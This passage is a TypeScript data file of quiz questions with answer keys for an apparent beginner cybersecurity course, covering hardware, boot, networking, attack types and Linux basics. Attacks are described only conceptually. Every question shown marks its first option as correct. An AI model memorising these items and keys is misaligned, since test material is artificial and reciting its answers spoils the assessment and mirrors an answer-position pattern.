import type { TopicQuiz } from "@/types"
export const TOPIC_QUIZZES: TopicQuiz[] = [
  {
    topicId: "m0-1",
    questions: [
      {
        question: "What is the core cycle a CPU uses to process instructions?",
        options: [
          "Fetch-decode-execute",
          "Compile-link-load",
          "Read-write-verify",
          "Boot-init-run",
        ],
        correctIndex: 0,
        explanation:
          "The CPU repeatedly fetches an instruction, decodes it, and executes it - this fetch-decode-execute cycle is the fundamental CPU operation.",
      },
      {
        question:
          "In a classic stack-based buffer overflow, what does the attacker overwrite to hijack execution?",
        options: [
          "The instruction pointer/return address",
          "An ALU register used only for arithmetic",
          "A GPU shader register",
          "The CPU's clock speed setting",
        ],
        correctIndex: 0,
        explanation:
          "Overwriting the return address changes what the CPU's instruction pointer (EIP/RIP) points to next, redirecting execution to attacker-controlled code.",
      },
      {
        question:
          "Which two factors most directly determine how many instructions a CPU can execute per second?",
        options: [
          "Number of cores and clock speed (GHz)",
          "RAM size and ROM size",
          "HDD RPM and SSD TRIM support",
          "MAC address and ARP cache size",
        ],
        correctIndex: 0,
        explanation:
          "More cores allow parallel instruction streams and higher clock speed means more cycles per second, together determining raw execution throughput.",
      },
    ],
  },
  {
    topicId: "m0-2",
    questions: [
      {
        question:
          "Which type of memory loses all its contents when power is removed?",
        options: ["RAM", "ROM", "EEPROM", "BIOS firmware chip"],
        correctIndex: 0,
        explanation:
          "RAM is volatile memory that holds data only while powered, unlike ROM/EEPROM which retain firmware without power.",
      },
      {
        question:
          "Why do forensic investigators prioritize capturing a live RAM dump?",
        options: [
          "It can reveal encryption keys, passwords, and running-process artefacts that only exist in memory",
          "RAM permanently stores every file ever opened",
          "RAM contents survive being fully powered off for weeks",
          "RAM only contains BIOS settings",
        ],
        correctIndex: 0,
        explanation:
          "Because RAM is volatile and holds live data, a dump captured before shutdown can recover secrets like encryption keys that never touch disk.",
      },
      {
        question:
          "Why do BIOS/UEFI settings survive a reboot even with no active power source on the board?",
        options: [
          "Settings are stored in EEPROM, a non-volatile type of ROM",
          "Settings are cached in the CPU registers",
          "Settings are stored in RAM, which never loses power",
          "The user re-enters settings every boot",
        ],
        correctIndex: 0,
        explanation:
          "EEPROM is non-volatile, so BIOS/UEFI configuration persists across power cycles unlike volatile RAM.",
      },
    ],
  },
  {
    topicId: "m0-3",
    questions: [
      {
        question:
          "Which storage technology connects directly over the PCIe bus for the highest throughput and lowest latency?",
        options: [
          "NVMe",
          "SATA HDD",
          "Legacy IDE hard drive",
          "Optical (CD/DVD) drive",
        ],
        correctIndex: 0,
        explanation:
          "NVMe bypasses the older SATA interface and talks to the CPU directly over PCIe, giving far higher throughput and lower latency than SATA-based storage.",
      },
      {
        question: "Why is deleted data often still recoverable on an HDD?",
        options: [
          "Deletion typically just removes the file's pointer, leaving the magnetic data intact until overwritten",
          "HDDs encrypt all data by default, which is trivially reversible",
          "HDDs use TRIM, which instantly destroys the underlying data",
          "HDD platters cannot store data once a file is deleted",
        ],
        correctIndex: 0,
        explanation:
          "Deleting a file on an HDD generally removes the filesystem's reference to the data, not the underlying magnetic bits, which is why forensic recovery is often possible.",
      },
      {
        question:
          "Why does full-disk encryption matter more on modern SSD/NVMe drives than on older HDDs, per this topic?",
        options: [
          "TRIM and wear-levelling make reliably wiping deleted data harder, so encryption is the more dependable protection",
          "SSDs cannot be encrypted at all",
          "HDDs are inherently more secure than SSDs",
          "NVMe drives store all data in plaintext ROM",
        ],
        correctIndex: 0,
        explanation:
          "Because SSD/NVMe wear-levelling relocates data unpredictably, secure erasure is unreliable, making full-disk encryption the more dependable protection.",
      },
    ],
  },
  {
    topicId: "m0-4",
    questions: [
      {
        question:
          "Why are GPUs commonly used for password-cracking tools like Hashcat?",
        options: [
          "Their massively parallel core architecture lets them attempt many hash calculations simultaneously",
          "GPUs store plaintext passwords by default",
          "GPUs replace the CPU's fetch-decode-execute cycle entirely",
          "GPUs directly read and modify ROM firmware",
        ],
        correctIndex: 0,
        explanation:
          "A GPU's huge number of simple parallel cores is ideal for running the same hashing operation across many candidate passwords at once, far faster than a CPU alone.",
      },
      {
        question:
          "Which partitioning scheme does UEFI use that supports disks larger than 2TB?",
        options: ["GPT", "MBR", "NTFS", "FAT32"],
        correctIndex: 0,
        explanation:
          "GPT, used by UEFI, removes the roughly 2TB and 4-primary-partition limits of the older MBR scheme used by legacy BIOS.",
      },
      {
        question: "What does Secure Boot specifically protect against?",
        options: [
          "Unsigned/unauthorised bootloader code persisting through a reimage (e.g. bootkits)",
          "Ransomware encrypting user files after the OS has loaded",
          "A hard drive failing due to mechanical wear",
          "Someone guessing a weak Windows login password",
        ],
        correctIndex: 0,
        explanation:
          "Secure Boot verifies the digital signature of bootloader code before running it, blocking unsigned bootkits from persisting even across a reimage.",
      },
    ],
  },
  {
    topicId: "m0-5",
    questions: [
      {
        question: "Which sequence correctly describes the boot hand-off chain?",
        options: [
          "POST -> firmware reads MBR/GPT -> boot loader -> kernel -> init process",
          "Kernel -> POST -> boot loader -> firmware",
          "Init process -> kernel -> POST -> firmware",
          "Boot loader -> init process -> POST -> kernel",
        ],
        correctIndex: 0,
        explanation:
          "Firmware runs POST, reads the partition table, hands off to the boot loader, which loads the kernel, which finally starts the init process.",
      },
      {
        question: "What is PID 1 responsible for on a modern Linux system?",
        options: [
          "It is the init process (commonly systemd) that starts after the kernel mounts the root filesystem",
          "It is the first user-mode GUI application shown to the user",
          "It is a BIOS-level hardware check routine",
          "It is the kernel's virtual memory manager",
        ],
        correctIndex: 0,
        explanation:
          "After the kernel mounts the root filesystem it starts the init process as PID 1, which on modern Linux is typically systemd.",
      },
      {
        question:
          "Which command displays the current systemd default boot target?",
        options: [
          "systemctl get-default",
          "bootrec /fixmbr",
          "arp -a",
          "iptables -L",
        ],
        correctIndex: 0,
        explanation:
          "systemctl get-default reports the systemd target the system boots into by default, such as multi-user.target or graphical.target.",
      },
    ],
  },
  {
    topicId: "m1-1",
    questions: [
      {
        question:
          "What does cybersecurity primarily aim to ensure about digital assets?",
        options: [
          "Confidentiality, integrity, and availability",
          "Only preventing physical theft of hardware",
          "Faster internet speeds",
          "Cheaper cloud storage costs",
        ],
        correctIndex: 0,
        explanation:
          "Cybersecurity protects systems and data by ensuring confidentiality, integrity, and availability against threats and unauthorized access.",
      },
      {
        question:
          "Which of the following is a direct benefit of cybersecurity mentioned in the topic?",
        options: [
          "Helping organisations comply with regulations like GDPR and ISO 27001",
          "Eliminating the need for backups",
          "Guaranteeing 100% uptime with no controls",
          "Replacing the need for authorised testing",
        ],
        correctIndex: 0,
        explanation:
          "Cybersecurity practices help organisations meet regulatory obligations such as GDPR and ISO 27001, alongside preventing breaches and fraud.",
      },
      {
        question: "Why does cybersecurity matter for business continuity?",
        options: [
          "It helps prevent disruptive cyberattacks that could halt operations",
          "It only matters for personal home computers",
          "It guarantees a company will never be breached",
          "It replaces the need for IT support",
        ],
        correctIndex: 0,
        explanation:
          "Preventing disruptive attacks such as ransomware or DDoS keeps critical business operations running, which is a core cybersecurity goal.",
      },
    ],
  },
  {
    topicId: "m1-2",
    questions: [
      {
        question:
          "In the CIA Triad, which pillar does encrypting a file primarily protect?",
        options: [
          "Confidentiality",
          "Integrity",
          "Availability",
          "Authentication",
        ],
        correctIndex: 0,
        explanation:
          "Encryption restricts readability to authorised parties, which is the definition of confidentiality.",
      },
      {
        question:
          "Which CIA Triad pillar does a cryptographic hash check primarily verify?",
        options: [
          "Integrity",
          "Confidentiality",
          "Availability",
          "Non-repudiation",
        ],
        correctIndex: 0,
        explanation:
          "A hash lets you confirm data has not been altered, which is the definition of integrity.",
      },
      {
        question:
          "A DDoS attack that takes a website offline for legitimate users primarily violates which CIA pillar?",
        options: [
          "Availability",
          "Confidentiality",
          "Integrity",
          "Accountability",
        ],
        correctIndex: 0,
        explanation:
          "Availability means legitimate users can access data/services when needed; a DDoS attack directly denies that access.",
      },
    ],
  },
  {
    topicId: "m1-3",
    questions: [
      {
        question:
          "Which security domain focuses on simulating attacks to find vulnerabilities before real attackers do?",
        options: [
          "Offensive Security",
          "GRC",
          "Defensive Security (SOC)",
          "None of these",
        ],
        correctIndex: 0,
        explanation:
          "Offensive Security includes pentesting, red teaming, and bug bounty work that simulates real attacks to find weaknesses proactively.",
      },
      {
        question:
          "Which domain is primarily responsible for policies, risk assessment, and meeting standards like ISO 27001 or HIPAA?",
        options: [
          "GRC (Governance, Risk, Compliance)",
          "Offensive Security",
          "Network Security tooling only",
          "Incident Response only",
        ],
        correctIndex: 0,
        explanation:
          "GRC covers governance frameworks, risk assessment, and compliance with legal/regulatory standards such as GDPR, ISO 27001, and HIPAA.",
      },
      {
        question:
          "A SOC analyst patching systems and blocking unauthorised access is working primarily in which domain?",
        options: [
          "Defensive Security",
          "Offensive Security",
          "GRC",
          "Bug bounty hunting",
        ],
        correctIndex: 0,
        explanation:
          "Defensive Security (blue team/SOC) focuses on protecting systems, patching, and preventing unauthorised access, as opposed to simulating attacks.",
      },
    ],
  },
  {
    topicId: "m1-4",
    questions: [
      {
        question:
          "Which attack type specifically encrypts victim data and demands payment for the decryption key?",
        options: ["Ransomware", "Phishing", "DDoS", "MITM"],
        correctIndex: 0,
        explanation:
          "Ransomware is malware that encrypts a victim's files and demands payment, usually in cryptocurrency, for the decryption key.",
      },
      {
        question:
          "ARP spoofing is a technique commonly used to carry out which attack type?",
        options: ["MITM (Man-in-the-Middle)", "DDoS", "Ransomware", "Phishing"],
        correctIndex: 0,
        explanation:
          "ARP spoofing lets an attacker position themselves between two hosts on a LAN, enabling interception/modification of traffic - a classic MITM technique.",
      },
      {
        question:
          "Which attack overwhelms a service with traffic from many sources to make it unavailable?",
        options: ["DDoS", "Phishing", "Ransomware", "MITM"],
        correctIndex: 0,
        explanation:
          "DDoS (Distributed Denial of Service) floods a target with traffic from many sources so legitimate users cannot get through.",
      },
    ],
  },
  {
    topicId: "m1-5",
    questions: [
      {
        question: "What does a CVE identifier uniquely refer to?",
        options: [
          "A specific, publicly known vulnerability",
          "A general class/root cause of weakness",
          "A confirmed breach in progress",
          "A named threat actor group",
        ],
        correctIndex: 0,
        explanation:
          "CVE (Common Vulnerabilities and Exposures) assigns a unique public ID to one specific known vulnerability, e.g. CVE-2021-44228 for Log4Shell.",
      },
      {
        question:
          "CWE-79 is the root-cause weakness class behind which vulnerability type?",
        options: [
          "Cross-Site Scripting (XSS)",
          "SQL Injection",
          "Buffer Overflow",
          "SSRF",
        ],
        correctIndex: 0,
        explanation:
          "CWE-79 (Improper Neutralization of Input During Web Page Generation) is the CWE describing the root cause behind all XSS vulnerabilities.",
      },
      {
        question: "What best describes a zero-day vulnerability?",
        options: [
          "A vulnerability unknown to the vendor with no patch available",
          "Any vulnerability discovered within the last 24 hours",
          "A vulnerability that has already been fully patched",
          "A vulnerability only found in outdated software",
        ],
        correctIndex: 0,
        explanation:
          "A zero-day is a flaw the vendor does not yet know about (or hasn't patched), meaning there has been zero days to prepare a fix.",
      },
    ],
  },
  {
    topicId: "m1-6",
    questions: [
      {
        question:
          "What must you obtain before testing any system you do not own?",
        options: [
          "Written authorisation (Rules of Engagement)",
          "A verbal promise from a friend who works there",
          "Nothing, if your intent is good",
          "A VPN connection to the target",
        ],
        correctIndex: 0,
        explanation:
          "Written authorisation and defined Rules of Engagement are required before testing any system you don't own, regardless of good intentions.",
      },
      {
        question:
          "What does 'responsible disclosure' mean in the context of finding a vulnerability?",
        options: [
          "Reporting the vulnerability to the vendor/owner before any public disclosure",
          "Publishing the exploit on social media immediately for credit",
          "Selling the vulnerability to the highest bidder",
          "Ignoring it since it is not your job to report it",
        ],
        correctIndex: 0,
        explanation:
          "Responsible disclosure means giving the vendor/owner a chance to fix the issue before any public release of details.",
      },
      {
        question:
          "Why is unauthorised access illegal in most jurisdictions even if the tester had good intentions?",
        options: [
          "Laws like the Computer Misuse Act or CFAA criminalise unauthorised access regardless of intent",
          "Intent is always a full legal defence",
          "Only causing financial damage is illegal",
          "These laws only apply to nation-state actors",
        ],
        correctIndex: 0,
        explanation:
          "Laws such as the UK Computer Misuse Act and the US CFAA criminalise unauthorised access to computer systems irrespective of the tester's motive.",
      },
    ],
  },
  {
    topicId: "m2-1",
    questions: [
      {
        question: "Which OSI layer do MAC addresses and switches operate at?",
        options: [
          "Layer 2 (Data Link)",
          "Layer 3 (Network)",
          "Layer 7 (Application)",
          "Layer 1 (Physical)",
        ],
        correctIndex: 0,
        explanation:
          "MAC addresses and switch forwarding decisions operate at Layer 2, the Data Link layer.",
      },
      {
        question:
          "At which OSI layer does a Web Application Firewall (WAF) primarily defend?",
        options: [
          "Layer 7 (Application)",
          "Layer 2 (Data Link)",
          "Layer 4 (Transport)",
          "Layer 1 (Physical)",
        ],
        correctIndex: 0,
        explanation:
          "A WAF inspects application-level content like HTTP requests, placing its defence at Layer 7.",
      },
      {
        question:
          "Which statement best captures the OSI vs TCP/IP relationship as taught in this topic?",
        options: [
          "TCP/IP is the actual engine networks run on; OSI is a theoretical blueprint/reference model",
          "OSI is what real networks run on; TCP/IP is purely theoretical",
          "Both models have exactly the same number of layers",
          "OSI has 4 layers and TCP/IP has 7",
        ],
        correctIndex: 0,
        explanation:
          "The topic explicitly frames TCP/IP as the real-world engine while OSI serves as the conceptual blueprint used for vocabulary and reference.",
      },
    ],
  },
  {
    topicId: "m2-2",
    questions: [
      {
        question:
          "How many layers does the TCP/IP model have, compared to OSI's seven?",
        options: ["4", "7", "5", "3"],
        correctIndex: 0,
        explanation:
          "TCP/IP condenses networking into 4 layers: Application, Transport, Internet, and Network Access, versus OSI's 7.",
      },
      {
        question:
          "Which protocol operates at the TCP/IP model's Internet layer?",
        options: ["IP", "HTTP", "FTP", "Ethernet"],
        correctIndex: 0,
        explanation:
          "IP (along with ICMP) operates at the Internet layer, handling addressing and routing of packets.",
      },
      {
        question:
          "Which pairing correctly matches a TCP/IP feature to its description?",
        options: [
          "TCP provides reliable, ordered, error-checked delivery while IP handles addressing and routing",
          "TCP handles addressing while IP guarantees delivery order",
          "Both TCP and IP operate only at the Application layer",
          "IP is connection-oriented while TCP is connectionless",
        ],
        correctIndex: 0,
        explanation:
          "TCP focuses on reliable, ordered delivery of data, while IP is responsible for addressing and routing packets to their destination.",
      },
    ],
  },
  {
    topicId: "m2-3",
    questions: [
      {
        question:
          "How many usable host addresses does a /24 network typically provide?",
        options: ["254", "256", "255", "252"],
        correctIndex: 0,
        explanation:
          "A /24 has 256 total addresses, minus the network and broadcast addresses, leaving 254 usable hosts.",
      },
      {
        question: "What does CIDR notation like /24 define?",
        options: [
          "How many bits of the address are the network portion vs the host portion",
          "The exact MAC address of the gateway",
          "The physical cable length allowed",
          "The DNS server to use",
        ],
        correctIndex: 0,
        explanation:
          "CIDR notation specifies the prefix length, i.e. how many leading bits identify the network versus the remaining host bits.",
      },
      {
        question: "Why was IPv6 introduced alongside IPv4?",
        options: [
          "To solve IPv4 address exhaustion with its much larger 128-bit address space",
          "To replace TCP with a faster transport protocol",
          "To eliminate the need for subnetting entirely",
          "To provide backward compatibility with MAC addresses",
        ],
        correctIndex: 0,
        explanation:
          "IPv6's 128-bit address space vastly exceeds IPv4's 32-bit space, solving the exhaustion of available IPv4 addresses.",
      },
    ],
  },
  {
    topicId: "m2-4",
    questions: [
      {
        question:
          "Which port is associated with encrypted web traffic (HTTPS)?",
        options: ["443", "80", "21", "25"],
        correctIndex: 0,
        explanation:
          "Port 443 is the standard port for HTTPS, which wraps HTTP traffic in TLS encryption.",
      },
      {
        question:
          "Which protocol resolves domain names to IP addresses, typically over port 53?",
        options: ["DNS", "FTP", "SMTP", "RDP"],
        correctIndex: 0,
        explanation:
          "DNS is the 'phone book' of the internet, translating domain names to IP addresses, usually over port 53.",
      },
      {
        question:
          "Which of these is described as a UDP-based service favouring speed over reliability?",
        options: [
          "DNS queries",
          "FTP file transfer",
          "SSH remote administration",
          "HTTP over TCP",
        ],
        correctIndex: 0,
        explanation:
          "The topic notes DNS queries and streaming as UDP-based traffic that favours speed over guaranteed delivery.",
      },
    ],
  },
  {
    topicId: "m2-5",
    questions: [
      {
        question: "What is the correct order of the ARP resolution process?",
        options: [
          "Check ARP cache -> broadcast ARP Request -> receive unicast ARP Reply -> update cache",
          "Broadcast ARP Reply -> check cache -> unicast Request",
          "Update cache -> broadcast Request -> check cache",
          "Send unicast Request -> broadcast Reply -> check cache",
        ],
        correctIndex: 0,
        explanation:
          "A host first checks its local ARP cache, and only if the mapping is missing does it broadcast a Request and wait for a unicast Reply to update the cache.",
      },
      {
        question: "What does ARP spoofing/poisoning let an attacker do?",
        options: [
          "Map their own MAC address to a legitimate IP to intercept traffic (enabling MITM)",
          "Permanently change a target's public IP address",
          "Bypass TLS certificate validation on any site",
          "Disable DNS resolution across the entire internet",
        ],
        correctIndex: 0,
        explanation:
          "ARP spoofing tricks other hosts on the LAN into associating a legitimate IP with the attacker's MAC address, enabling man-in-the-middle interception.",
      },
      {
        question:
          "Why can't a MAC address alone be used to route traffic across the internet?",
        options: [
          "MAC addresses only operate within a local network segment; routers use IP beyond it",
          "MAC addresses are globally routable like IP addresses",
          "Routers only understand MAC addresses, not IP",
          "MAC addresses change on every packet sent",
        ],
        correctIndex: 0,
        explanation:
          "MAC addresses are Layer 2 identifiers valid only on the local segment; routers rely on IP addresses to forward traffic between networks.",
      },
    ],
  },
  {
    topicId: "m2-6",
    questions: [
      {
        question:
          "Which protocol establishes a connection via a 3-way handshake before sending data?",
        options: ["TCP", "UDP", "ARP", "ICMP"],
        correctIndex: 0,
        explanation:
          "TCP is connection-oriented and uses a SYN, SYN-ACK, ACK handshake to establish a reliable connection before data transfer.",
      },
      {
        question:
          "Why is UDP preferred for services like live video calls and DNS queries?",
        options: [
          "It is connectionless and faster, without waiting for delivery guarantees",
          "It guarantees in-order, reliable delivery like TCP",
          "It encrypts data by default",
          "It performs a 3-way handshake for reliability",
        ],
        correctIndex: 0,
        explanation:
          "UDP skips connection setup and delivery guarantees, trading reliability for the speed needed by real-time services.",
      },
      {
        question:
          "How does Nmap's approach differ between TCP and UDP scanning?",
        options: [
          "UDP scanning (-sU) is typically much slower than TCP SYN scanning (-sS)",
          "TCP and UDP scans in Nmap run at identical speed",
          "UDP scanning is always faster than TCP scanning",
          "Nmap cannot scan UDP ports at all",
        ],
        correctIndex: 0,
        explanation:
          "Because UDP has no handshake and often requires waiting on timeouts or ICMP responses, UDP scans (-sU) are much slower than TCP SYN scans (-sS).",
      },
    ],
  },
  {
    topicId: "m2-7",
    questions: [
      {
        question:
          "Which device forwards traffic based on the destination MAC address (Layer 2)?",
        options: ["Switch", "Hub", "Router", "Firewall"],
        correctIndex: 0,
        explanation:
          "A switch builds a MAC address table and forwards frames only to the port associated with the destination MAC, unlike a hub.",
      },
      {
        question:
          "Which device is the 'dumbest' of the three, broadcasting to every port with no intelligence?",
        options: ["Hub", "Switch", "Router", "Layer 3 switch"],
        correctIndex: 0,
        explanation:
          "A hub has no addressing intelligence and simply repeats incoming signals out every other port, which is why it is largely obsolete.",
      },
      {
        question:
          "Which device routes packets between different networks based on IP address and supports ACLs?",
        options: ["Router", "Hub", "Unmanaged switch", "Repeater"],
        correctIndex: 0,
        explanation:
          "A router operates at Layer 3, forwarding packets between distinct networks using IP addresses and enforcing access control lists.",
      },
    ],
  },
  {
    topicId: "m2-8",
    questions: [
      {
        question:
          "Which firewall type tracks the state and context of a connection rather than just inspecting isolated packets?",
        options: [
          "Stateful Inspection firewall",
          "Simple packet-filtering firewall",
          "Hub",
          "Unmanaged switch",
        ],
        correctIndex: 0,
        explanation:
          "Stateful inspection firewalls track ongoing connection state and session context, unlike simple packet filters that check each packet in isolation.",
      },
      {
        question:
          "What distinguishes an NGFW (Next-Generation Firewall) from a basic packet filter?",
        options: [
          "It combines deep packet inspection, IPS, and application awareness, including inspecting HTTPS traffic",
          "It only filters by IP and port like a basic packet filter",
          "It cannot inspect encrypted traffic at all",
          "It operates exclusively at Layer 1",
        ],
        correctIndex: 0,
        explanation:
          "NGFWs add deep packet inspection, intrusion prevention, and application-layer awareness on top of basic filtering, including HTTPS inspection.",
      },
      {
        question:
          "Which command lists the current iptables rule set on a Linux firewall?",
        options: ["iptables -L", "arp -a", "ss -tulpn", "netstat -tulpn"],
        correctIndex: 0,
        explanation:
          "iptables -L lists all currently configured rules across the default chains.",
      },
    ],
  },
  {
    topicId: "m2-9",
    questions: [
      {
        question:
          "What is a key functional difference between a VPN and a typical proxy?",
        options: [
          "A VPN encrypts all traffic through a tunnel, while a typical proxy is a simple, often unencrypted middleman",
          "A proxy always encrypts traffic while a VPN never does",
          "VPNs only work for HTTP traffic",
          "Proxies always provide stronger security than VPNs",
        ],
        correctIndex: 0,
        explanation:
          "A VPN creates a fully encrypted tunnel for all traffic, whereas most proxy types simply relay traffic without encryption.",
      },
      {
        question:
          "Why might using a VPN feel slower than a direct internet connection?",
        options: [
          "The encryption overhead of tunnelling all traffic adds processing and latency",
          "VPNs use no encryption so there is no overhead",
          "VPNs only work over UDP, which is inherently slow",
          "VPNs bypass the internet entirely",
        ],
        correctIndex: 0,
        explanation:
          "Encrypting and tunnelling all traffic adds processing overhead, which is the tradeoff for the privacy/security a VPN provides.",
      },
      {
        question:
          "Why do platforms like TryHackMe and HackTheBox require a VPN connection?",
        options: [
          "To let your machine reach the isolated lab network hosting the vulnerable machines",
          "To permanently block you from completing any room",
          "To speed up your general internet connection",
          "To hide your public IP from the lab's scoring server only",
        ],
        correctIndex: 0,
        explanation:
          "The VPN tunnels your traffic into the platform's private lab network so you can reach the target machines directly.",
      },
    ],
  },
  {
    topicId: "m2-10",
    questions: [
      {
        question: "What is the primary purpose of NAT?",
        options: [
          "Translating private internal IP addresses to a shared public IP for internet-bound traffic",
          "Encrypting all outbound traffic",
          "Assigning MAC addresses to new devices",
          "Blocking malicious traffic based on signatures",
        ],
        correctIndex: 0,
        explanation:
          "NAT translates many private internal IP addresses to one (or a few) public IPs so devices can share limited public address space.",
      },
      {
        question:
          "What is a side effect of NAT that must be worked around for inbound connections to an internal service?",
        options: [
          "Port forwarding is required to reach an internal service from outside the network",
          "NAT makes all internal services directly reachable from the internet",
          "NAT removes the need for a public IP entirely",
          "NAT always blocks internal devices from reaching the internet",
        ],
        correctIndex: 0,
        explanation:
          "Because NAT hides internal IPs behind one public IP, an explicit port-forwarding rule is needed to route inbound connections to a specific internal host.",
      },
      {
        question: "How does NAT help conserve IPv4 address space?",
        options: [
          "It lets many internal devices share a single public IP address",
          "It generates new public IP ranges on demand",
          "It converts IPv4 addresses into IPv6 permanently",
          "It eliminates the need for routers",
        ],
        correctIndex: 0,
        explanation:
          "By translating many private addresses to one shared public address, NAT reduces the number of public IPv4 addresses an organisation needs.",
      },
    ],
  },
  {
    topicId: "m2-11",
    questions: [
      {
        question:
          "What is the correct first step after typing a URL and hitting Enter?",
        options: [
          "The browser checks its cache, then performs DNS resolution to find the server's IP",
          "The browser immediately renders the page from a cached copy only",
          "The browser sends the HTTP request before resolving DNS",
          "The server immediately pushes HTML without any request",
        ],
        correctIndex: 0,
        explanation:
          "The browser first checks cache, then resolves the domain to an IP via DNS before any connection is made.",
      },
      {
        question:
          "What establishes the initial connection to the server's IP on port 443 before encrypted data is sent?",
        options: [
          "The TCP 3-way handshake (SYN, SYN-ACK, ACK)",
          "The DNS TTL expiration",
          "The browser's rendering engine",
          "An ARP broadcast sent directly to the destination server",
        ],
        correctIndex: 0,
        explanation:
          "A TCP 3-way handshake establishes the connection to the server before any TLS negotiation or HTTP request occurs.",
      },
      {
        question:
          "What happens right after the TCP handshake completes for an HTTPS site?",
        options: [
          "A TLS handshake negotiates encryption before the HTTP request is sent",
          "The HTTP request is sent in plaintext with no further negotiation",
          "The browser immediately displays the final rendered page",
          "The DNS resolver re-resolves the domain a second time",
        ],
        correctIndex: 0,
        explanation:
          "After the TCP handshake, a TLS handshake negotiates the encryption parameters before the browser sends the HTTP request over the encrypted channel.",
      },
    ],
  },
  {
    topicId: "m2-12",
    questions: [
      {
        question:
          "In Wireshark, which feature lets you view the full request/response conversation for one TCP connection?",
        options: [
          "Right-click a packet -> Follow -> TCP Stream",
          "Statistics -> Protocol Hierarchy view only",
          "The Capture Options dialog",
          "The Preferences menu",
        ],
        correctIndex: 0,
        explanation:
          "Follow -> TCP Stream reconstructs the full back-and-forth conversation of a single TCP connection into one readable view.",
      },
      {
        question:
          "Why is HTTPS traffic harder to interpret directly in a Wireshark capture than plain HTTP?",
        options: [
          "HTTPS traffic is encrypted, so the payload content is not visible in plaintext",
          "HTTPS uses a completely different packet format Wireshark cannot capture",
          "HTTPS never uses TCP so Wireshark cannot follow the stream",
          "Wireshark blocks capturing HTTPS traffic by default",
        ],
        correctIndex: 0,
        explanation:
          "TLS encryption hides the HTTP payload from plaintext inspection, unlike unencrypted HTTP or FTP traffic.",
      },
      {
        question:
          "What should you confirm first when verifying a connection was properly established before an HTTP GET?",
        options: [
          "The 3-way TCP handshake (SYN, SYN-ACK, ACK) preceding the request",
          "An ARP reply only",
          "A DNS TXT record",
          "The firewall's iptables rule list",
        ],
        correctIndex: 0,
        explanation:
          "A completed 3-way handshake confirms the TCP connection was properly established before any application-layer request was sent.",
      },
    ],
  },
  {
    topicId: "m2-13",
    questions: [
      {
        question: "For a /26 subnet, how many host bits remain?",
        options: ["6", "8", "24", "2"],
        correctIndex: 0,
        explanation:
          "Host bits = 32 - prefix length, so for /26 that is 32 - 26 = 6 host bits.",
      },
      {
        question: "How many total addresses does a /26 subnet contain?",
        options: ["64", "32", "128", "256"],
        correctIndex: 0,
        explanation: "Total addresses = 2^(host bits) = 2^6 = 64.",
      },
      {
        question:
          "Why are the network and broadcast addresses excluded from the usable host count in a subnet?",
        options: [
          "The network address identifies the subnet itself and the broadcast address is reserved for reaching all hosts on it",
          "Both addresses are reserved for the ISP's exclusive use",
          "They are reserved specifically for the default gateway",
          "They are only excluded in IPv6, not IPv4",
        ],
        correctIndex: 0,
        explanation:
          "The first address identifies the subnet (network address) and the last is reserved for broadcasting to every host on it, so neither is assignable to a device.",
      },
    ],
  },
  {
    topicId: "m3-linux-1",
    questions: [
      {
        question: "What combination makes up a Linux 'distro'?",
        options: [
          "Kernel + software + package manager",
          "Just the kernel alone",
          "Only a GUI desktop environment",
          "A single vendor's proprietary binary",
        ],
        correctIndex: 0,
        explanation:
          "A distro bundles the Linux kernel with a set of software and a package manager, as described for examples like Kali, Mint, Ubuntu, and Arch.",
      },
      {
        question:
          "Which distro is purpose-built for pentesting and ships tools like Nmap, Burp, and Metasploit pre-installed?",
        options: ["Kali Linux", "Linux Mint", "Ubuntu Server", "Arch Linux"],
        correctIndex: 0,
        explanation:
          "Kali Linux ships pre-loaded with the pentesting tools used throughout this programme, unlike beginner or server-focused distros.",
      },
      {
        question:
          "Who created the Linux kernel and when was it first released?",
        options: [
          "Linus Torvalds, released 17 Sept 1991",
          "Richard Stallman, released 1983",
          "Dennis Ritchie, released 1969",
          "Bill Gates, released 1995",
        ],
        correctIndex: 0,
        explanation:
          "The Linux kernel was created by Linus Torvalds and first released on 17 September 1991 to fill the gap of a free kernel for the GNU project.",
      },
    ],
  },
  {
    topicId: "m3-linux-2",
    questions: [
      {
        question:
          "Which directory holds variable, frequently-changing data such as logs?",
        options: ["/var", "/etc", "/bin", "/home"],
        correctIndex: 0,
        explanation:
          "/var stores variable data like logs, while /etc holds configuration and /bin holds system binaries.",
      },
      {
        question:
          "Which directory is cleared on reboot and used for temporary files?",
        options: ["/tmp", "/usr", "/opt", "/root"],
        correctIndex: 0,
        explanation:
          "/tmp is designated for temporary files and is typically cleared on reboot.",
      },
      {
        question:
          "What is the key structural difference between Linux and Windows filesystems?",
        options: [
          "Linux uses a single rooted tree with other drives mounted into it, rather than separate drive letters",
          "Linux uses drive letters exactly like Windows",
          "Windows has no concept of a root directory",
          "Linux cannot mount additional storage devices",
        ],
        correctIndex: 0,
        explanation:
          "Linux organises everything under one root (/) tree, with additional drives mounted into that tree instead of assigned separate drive letters.",
      },
    ],
  },
  {
    topicId: "m3-linux-3",
    questions: [
      {
        question: "What is the difference between find and locate?",
        options: [
          "find searches the live filesystem by criteria; locate uses a prebuilt index that can be stale",
          "find only searches file names, never the live filesystem; locate always searches live",
          "Both commands are functionally identical",
          "locate can only find directories, never files",
        ],
        correctIndex: 0,
        explanation:
          "find walks the actual filesystem in real time, while locate queries a prebuilt index that is faster but can be out of date.",
      },
      {
        question: "In a filesystem path, what does '..' represent?",
        options: [
          "The parent directory",
          "The current directory",
          "The user's home directory",
          "The filesystem root",
        ],
        correctIndex: 0,
        explanation:
          "'.' refers to the current directory while '..' refers to its parent directory.",
      },
      {
        question:
          "Which command recursively removes a directory and its contents?",
        options: ["rm -r dir", "rm dir", "cp -r dir", "mv dir"],
        correctIndex: 0,
        explanation:
          "The -r (recursive) flag on rm is required to delete a directory along with everything inside it.",
      },
    ],
  },
  {
    topicId: "m3-linux-4",
    questions: [
      {
        question:
          "Which redirection operator appends output to a file instead of overwriting it?",
        options: [">>", ">", "<", "2>"],
        correctIndex: 0,
        explanation:
          ">> appends stdout to the end of a file, whereas > overwrites the file's existing contents.",
      },
      {
        question: "What is the purpose of piping (|) one command into another?",
        options: [
          "To feed the first command's stdout as the second command's stdin",
          "To run both commands completely independently in parallel",
          "To redirect stderr only",
          "To duplicate a file",
        ],
        correctIndex: 0,
        explanation:
          "A pipe chains commands together, sending the output of one directly into the input of the next.",
      },
      {
        question: "What does tee do that plain redirection (>) does not?",
        options: [
          "Writes output to the terminal AND a file simultaneously",
          "Only writes to a file, discarding terminal output",
          "Only works with stderr",
          "Compresses the output automatically",
        ],
        correctIndex: 0,
        explanation:
          "tee duplicates its input, showing it on screen while also writing it to a file, useful for logging a live scan.",
      },
    ],
